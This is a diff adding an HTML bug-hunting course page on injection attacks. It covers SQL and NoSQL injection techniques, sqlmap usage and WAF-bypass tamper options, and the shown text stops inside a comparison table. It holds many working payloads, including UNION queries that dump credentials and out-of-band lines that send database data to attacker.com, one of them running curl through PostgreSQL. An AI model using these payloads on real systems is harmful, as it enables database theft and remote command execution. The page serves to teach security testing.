@@ -1,0 +1,1760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 06: Injection Attacks Deep Dive - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body h3 { color: #c4a0d8; font-size: 1.05rem; font-weight: 400; margin: 28px 0 14px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-legacy { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-weak { background: rgba(234, 179, 8, 0.15); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .badge-current { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-latest { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .badge-info { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .badge-critical { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-high { background: rgba(249, 115, 22, 0.2); color: #fb923c; border: 1px solid rgba(249, 115, 22, 0.3); }
+        .badge-medium { background: rgba(234, 179, 8, 0.15); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .concept-tag { display: inline-block; margin-top: 10px; padding: 3px 10px; background: rgba(80, 40, 100, 0.3); border-radius: 12px; font-size: 0.65rem; color: #9333ea; letter-spacing: 0.1em; text-transform: uppercase; }
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre-wrap; }
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .flag { color: #fbbf24; }
+        .code-block .cmd { color: #c4a0d8; }
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+        .numbered-list { list-style: none; padding: 0; margin: 20px 0; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; padding: 12px 18px 12px 50px; margin-bottom: 8px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; position: relative; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 16px; top: 12px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #9333ea; font-weight: bold; }
+        .discussion-section { background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0; }
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+        .detail-section { border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; margin: 12px 0; overflow: hidden; }
+        .detail-header { padding: 16px 20px; background: rgba(15, 8, 20, 0.6); cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s ease; user-select: none; }
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+        .detail-body { display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4); border-top: 1px solid rgba(100, 60, 130, 0.1); color: #9a7aaa; font-size: 0.9rem; line-height: 1.7; }
+        .detail-body.open { display: block; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin: 20px 0; }
+        .tool-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+        .tool-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+        .tool-role { font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 10px; }
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+        @media (max-width: 768px) { .module-header { padding: 15px 20px; } .module-content { padding: 20px; } .two-col { grid-template-columns: 1fr; } .concept-grid { grid-template-columns: 1fr; } .tool-grid { grid-template-columns: 1fr; } .intro-title { font-size: 1.8rem; } .section-title { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 06</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#9889;</div>
+        <h1 class="intro-title">Injection Attacks Deep Dive</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 06 &bull; Injection</div>
+        <p class="intro-subtitle">
+            Injection vulnerabilities remain the most consequential class of web application flaws.
+            When user-controlled data crosses a trust boundary and is interpreted as code, commands,
+            or queries, the result ranges from full database compromise to remote code execution on
+            the underlying server. This module moves beyond surface-level detection into advanced
+            exploitation chains &mdash; UNION-based extraction, blind inference, template injection
+            to RCE, XXE exfiltration, and the filter bypass techniques required when WAFs and
+            sanitization stand between you and a confirmed finding.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">SQLi &bull; NoSQLi</div>
+            <div class="stat-pill">XSS Bypass</div>
+            <div class="stat-pill">SSTI &bull; CMDi</div>
+            <div class="stat-pill">XXE &bull; LDAP</div>
+            <div class="stat-pill">~35 min read</div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 01: SQL Injection Exploitation Chains                -->
+    <!-- ============================================================ -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128451;</span>
+            SQL Injection Exploitation Chains
+        </h2>
+        <div class="section-body">
+            <p>
+                SQL injection occurs when user input is concatenated directly into a SQL query string
+                without parameterization or adequate escaping. The attack surface includes GET/POST
+                parameters, HTTP headers (Cookie, Referer, User-Agent, X-Forwarded-For), JSON/XML
+                request bodies, and any value that ultimately reaches a SQL interpreter. Detection
+                begins with probe payloads; exploitation follows a methodical escalation from
+                confirming the vulnerability to extracting the entire database schema and contents.
+            </p>
+
+            <h3>Detection Probes</h3>
+            <p>
+                The initial goal is to determine whether user input influences query execution.
+                Each probe targets a different behavioral signal &mdash; syntax errors, boolean
+                differences, or timing delays.
+            </p>
+
+            <div class="code-block"><span class="comment"># Classic single-quote error trigger</span>
+<span class="cmd">GET</span> /products?id=<span class="str">1'</span>
+<span class="comment"># Expected: 500 error, SQL syntax error in response body or different page length</span>
+
+<span class="comment"># Boolean-based detection pair</span>
+<span class="cmd">GET</span> /products?id=<span class="str">1 AND 1=1</span>    <span class="comment"># True condition  &mdash; normal response</span>
+<span class="cmd">GET</span> /products?id=<span class="str">1 AND 1=2</span>    <span class="comment"># False condition &mdash; different response (empty, error, redirect)</span>
+
+<span class="comment"># Time-based detection (MySQL)</span>
+<span class="cmd">GET</span> /products?id=<span class="str">1 AND SLEEP(5)</span>
+<span class="comment"># Response delayed by ~5 seconds confirms injection</span>
+
+<span class="comment"># Time-based detection (PostgreSQL)</span>
+<span class="cmd">GET</span> /products?id=<span class="str">1; SELECT pg_sleep(5)--</span>
+
+<span class="comment"># Time-based detection (MSSQL)</span>
+<span class="cmd">GET</span> /products?id=<span class="str">1; WAITFOR DELAY '0:0:5'--</span></div>
+
+            <h3>Error-Based Extraction</h3>
+            <p>
+                When the application reflects database error messages in the response, you can
+                force the database to include sensitive data inside the error output. This is the
+                fastest extraction method because each request returns data directly.
+            </p>
+
+            <div class="code-block"><span class="comment"># MySQL: extractdb() via XPATH error</span>
+<span class="str">1' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- -</span>
+
+<span class="comment"># MySQL: updatexml() variant</span>
+<span class="str">1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- -</span>
+
+<span class="comment"># PostgreSQL: cast error leaks data</span>
+<span class="str">1' AND 1=CAST((SELECT version()) AS int)-- -</span>
+
+<span class="comment"># MSSQL: convert error leaks data</span>
+<span class="str">1' AND 1=CONVERT(int, (SELECT @@version))-- -</span></div>
+
+            <h3>UNION-Based Extraction</h3>
+            <p>
+                UNION-based SQLi appends a second SELECT statement to the original query, allowing
+                you to extract data from any table the database user can access. The technique
+                requires three prerequisite steps: determining the column count, identifying which
+                columns are reflected in output, and matching data types.
+            </p>
+
+            <div class="code-block"><span class="comment"># Step 1: Determine column count with ORDER BY</span>
+<span class="str">1' ORDER BY 1-- -</span>   <span class="comment"># OK</span>
+<span class="str">1' ORDER BY 2-- -</span>   <span class="comment"># OK</span>
+<span class="str">1' ORDER BY 3-- -</span>   <span class="comment"># OK</span>
+<span class="str">1' ORDER BY 4-- -</span>   <span class="comment"># Error &mdash; table has 3 columns</span>
+
+<span class="comment"># Alternative: NULL-based column count</span>
+<span class="str">1' UNION SELECT NULL-- -</span>            <span class="comment"># Error</span>
+<span class="str">1' UNION SELECT NULL,NULL-- -</span>       <span class="comment"># Error</span>
+<span class="str">1' UNION SELECT NULL,NULL,NULL-- -</span>  <span class="comment"># OK &mdash; 3 columns</span>
+
+<span class="comment"># Step 2: Identify reflected columns</span>
+<span class="str">1' UNION SELECT 'aaa','bbb','ccc'-- -</span>
+<span class="comment"># Check response body for 'aaa', 'bbb', 'ccc' to see which positions render</span>
+
+<span class="comment"># Step 3: Extract database version via reflected column (position 2)</span>
+<span class="str">1' UNION SELECT NULL,version(),NULL-- -</span>
+
+<span class="comment"># Step 4: Enumerate tables (MySQL)</span>
+<span class="str">1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -</span>
+
+<span class="comment"># Step 5: Enumerate columns of a target table</span>
+<span class="str">1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- -</span>
+
+<span class="comment"># Step 6: Extract data</span>
+<span class="str">1' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password),NULL FROM users-- -</span></div>
+
+            <h3>Blind Boolean-Based Extraction</h3>
+            <p>
+                When the application does not display errors or query results, but responds
+                differently to true versus false conditions, you extract data one bit or character
+                at a time by asking yes/no questions about the database contents.
+            </p>
+
+            <div class="code-block"><span class="comment"># Is the first character of the database name greater than 'm'?</span>
+<span class="str">1' AND (SELECT SUBSTRING(database(),1,1)) > 'm'-- -</span>
+
+<span class="comment"># Binary search narrows each character in ~7 requests</span>
+<span class="str">1' AND (SELECT SUBSTRING(database(),1,1)) > 's'-- -</span>  <span class="comment"># True</span>
+<span class="str">1' AND (SELECT SUBSTRING(database(),1,1)) > 'v'-- -</span>  <span class="comment"># False</span>
+<span class="str">1' AND (SELECT SUBSTRING(database(),1,1)) > 't'-- -</span>  <span class="comment"># True</span>
+<span class="str">1' AND (SELECT SUBSTRING(database(),1,1)) = 'u'-- -</span>  <span class="comment"># True &mdash; first char is 'u'</span>
+
+<span class="comment"># Extract table count</span>
+<span class="str">1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 5-- -</span></div>
+
+            <h3>Time-Based Blind Extraction</h3>
+            <p>
+                When even boolean differences are not observable &mdash; identical responses for
+                true and false conditions &mdash; timing becomes the side channel. You instruct
+                the database to sleep conditionally, then measure response latency.
+            </p>
+
+            <div class="code-block"><span class="comment"># MySQL time-based blind: if first char of db name is 'u', sleep 5 seconds</span>
+<span class="str">1' AND IF(SUBSTRING(database(),1,1)='u', SLEEP(5), 0)-- -</span>
+
+<span class="comment"># PostgreSQL time-based blind</span>
+<span class="str">1'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -</span>
+
+<span class="comment"># MSSQL time-based blind</span>
+<span class="str">1'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'-- -</span></div>
+
+            <h3>Second-Order SQL Injection</h3>
+            <p>
+                In second-order SQLi, the malicious payload is stored in the database during one
+                operation (registration, profile update) and executed later in a different query
+                context (admin panel, reporting, password reset). The injection point and the
+                execution point are in different request flows, making it invisible to automated
+                scanners that only test single request-response pairs.
+            </p>
+
+            <div class="code-block"><span class="comment"># Step 1: Register with a crafted username</span>
+<span class="cmd">POST</span> /register
+username=<span class="str">admin'-- -</span>&amp;password=anything&amp;email=test@test.com
+
+<span class="comment"># Step 2: Trigger password change (backend query uses stored username)</span>
+<span class="cmd">POST</span> /change-password
+current_password=anything&amp;new_password=hacked123
+
+<span class="comment"># Backend executes:</span>
+<span class="comment"># UPDATE users SET password='hacked123' WHERE username='admin'-- -'</span>
+<span class="comment"># The WHERE clause targets the real admin account</span></div>
+
+            <h3>Out-of-Band (OOB) Extraction</h3>
+            <p>
+                When all in-band channels are blocked &mdash; no errors, no boolean differences,
+                no timing variations &mdash; OOB techniques force the database to make an external
+                network request carrying extracted data. This requires the database server to have
+                outbound network access, typically DNS or HTTP.
+            </p>
+
+            <div class="code-block"><span class="comment"># MySQL OOB via LOAD_FILE + DNS (Windows only)</span>
+<span class="str">1' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\a'))-- -</span>
+
+<span class="comment"># MSSQL OOB via xp_dirtree + DNS</span>
+<span class="str">1'; DECLARE @d VARCHAR(1024); SET @d=(SELECT version()); EXEC('master..xp_dirtree "\\' + @d + '.attacker.com\a"')-- -</span>
+
+<span class="comment"># Oracle OOB via UTL_HTTP</span>
+<span class="str">1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual-- -</span>
+
+<span class="comment"># PostgreSQL OOB via COPY ... TO PROGRAM</span>
+<span class="str">1'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()-- -</span></div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">OOB Prerequisites</div>
+                    <div class="callout-text">
+                        OOB extraction requires outbound network access from the database server. Many
+                        production environments block outbound connections at the firewall level. DNS-based
+                        OOB has a higher success rate than HTTP because DNS egress is rarely filtered. Use
+                        a Burp Collaborator or interactsh listener to capture callbacks.
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div>
+                    <div class="callout-title">sqlmap Automation</div>
+                    <div class="callout-text">
+                        Once you have confirmed injection manually, sqlmap automates the full extraction
+                        chain. Always confirm manually first &mdash; blind automation generates excessive
+                        traffic and risks triggering WAF bans before you have documented the finding.
+                    </div>
+                </div>
+            </div>
+
+            <div class="code-block"><span class="comment"># sqlmap: basic detection and enumeration</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/products?id=1"</span> <span class="flag">--dbs</span>
+
+<span class="comment"># sqlmap: extract specific table with tamper scripts for WAF bypass</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/products?id=1"</span> <span class="flag">-D</span> webapp <span class="flag">-T</span> users <span class="flag">--dump</span> \
+  <span class="flag">--tamper</span>=space2comment,between,randomcase <span class="flag">--level</span>=3 <span class="flag">--risk</span>=2
+
+<span class="comment"># sqlmap: POST request with specific parameter</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/login"</span> <span class="flag">--data</span>=<span class="str">"user=admin&amp;pass=test"</span> <span class="flag">-p</span> user <span class="flag">--dbs</span>
+
+<span class="comment"># sqlmap: use saved request from Burp</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--batch</span> <span class="flag">--threads</span>=5</div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 02: NoSQL Injection                                  -->
+    <!-- ============================================================ -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128450;</span>
+            NoSQL Injection
+        </h2>
+        <div class="section-body">
+            <p>
+                NoSQL databases &mdash; MongoDB, CouchDB, Redis, Cassandra &mdash; use different query
+                languages and data models than relational databases, but the fundamental injection
+                principle is identical: when user input is incorporated into a query without validation,
+                an attacker can modify the query semantics. MongoDB is the most commonly targeted NoSQL
+                database in bug bounty programs because of its prevalence in Node.js applications and
+                the way its query operators map to JSON structures that overlap with HTTP parameter parsing.
+            </p>
+
+            <h3>MongoDB Operator Injection</h3>
+            <p>
+                MongoDB queries use JSON-like documents with special operators prefixed by <code>$</code>.
+                When an application passes user input directly into a MongoDB query object, an attacker
+                can inject these operators to alter the query logic. This is especially common when
+                Express.js or similar frameworks parse nested objects from query strings or JSON bodies.
+            </p>
+
+            <div class="code-block"><span class="comment"># Normal login request</span>
+<span class="cmd">POST</span> /api/login
+Content-Type: application/json
+{<span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: <span class="str">"secret123"</span>}
+
+<span class="comment"># Backend query (vulnerable)</span>
+db.users.find({username: req.body.username, password: req.body.password})
+
+<span class="comment"># Authentication bypass with $ne (not equal)</span>
+{<span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: {<span class="kw">"$ne"</span>: <span class="str">""</span>}}
+<span class="comment"># Query becomes: find where username=admin AND password != ""</span>
+<span class="comment"># Returns the admin user without knowing the password</span>
+
+<span class="comment"># Authentication bypass with $gt (greater than)</span>
+{<span class="str">"username"</span>: {<span class="kw">"$gt"</span>: <span class="str">""</span>}, <span class="str">"password"</span>: {<span class="kw">"$gt"</span>: <span class="str">""</span>}}
+<span class="comment"># Returns the first user where both fields are non-empty</span>
+
+<span class="comment"># Data extraction with $regex</span>
+{<span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: {<span class="kw">"$regex"</span>: <span class="str">"^s"</span>}}
+<span class="comment"># True if password starts with 's' &mdash; enumerate character by character</span>
+{<span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: {<span class="kw">"$regex"</span>: <span class="str">"^se"</span>}}
+{<span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: {<span class="kw">"$regex"</span>: <span class="str">"^sec"</span>}}</div>
+
+            <h3>URL-Encoded Operator Injection</h3>
+            <p>
+                When the backend uses a query string parser that supports bracket notation (common
+                in Express.js with <code>qs</code>), operators can be injected through URL parameters
+                without sending JSON.
+            </p>
+
+            <div class="code-block"><span class="comment"># URL-encoded operator injection via GET parameters</span>
+<span class="cmd">GET</span> /api/login?username=admin&amp;password[<span class="kw">$ne</span>]=
+
+<span class="comment"># URL-encoded via POST form data</span>
+<span class="cmd">POST</span> /api/login
+Content-Type: application/x-www-form-urlencoded
+username=admin&amp;password[<span class="kw">$ne</span>]=&amp;password[<span class="kw">$exists</span>]=true
+
+<span class="comment"># Enumerate all usernames with $regex</span>
+<span class="cmd">GET</span> /api/users?username[<span class="kw">$regex</span>]=^a&amp;password[<span class="kw">$gt</span>]=</div>
+
+            <h3>Server-Side JavaScript Injection ($where)</h3>
+            <p>
+                MongoDB's <code>$where</code> operator evaluates JavaScript expressions on the server.
+                If an attacker can inject into a <code>$where</code> clause, they achieve arbitrary
+                JavaScript execution within the MongoDB process &mdash; far more powerful than simple
+                query manipulation.
+            </p>
+
+            <div class="code-block"><span class="comment"># $where injection for authentication bypass</span>
+{<span class="str">"username"</span>: {<span class="kw">"$where"</span>: <span class="str">"return true"</span>}}
+
+<span class="comment"># Time-based detection via $where</span>
+{<span class="str">"username"</span>: {<span class="kw">"$where"</span>: <span class="str">"sleep(5000) || true"</span>}}
+
+<span class="comment"># Data exfiltration via $where + timed side channel</span>
+{<span class="str">"$where"</span>: <span class="str">"if(this.username=='admin' &amp;&amp; this.password.charAt(0)=='s') { sleep(5000); }"</span>}</div>
+
+            <h3>NoSQL vs SQL Injection Comparison</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Aspect</th>
+                        <th>SQL Injection</th>
+                        <th>NoSQL Injection</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Query Language</td>
+                        <td>SQL string concatenation</td>
+                        <td>JSON/BSON operator injection</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Auth Bypass</td>
+                        <td><code>' OR 1=1-- -</code></td>
+                        <td><code>{"$ne": ""}</code> or <code>{"$gt": ""}</code></td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Data Extraction</td>
+                        <td>UNION SELECT, error-based</td>
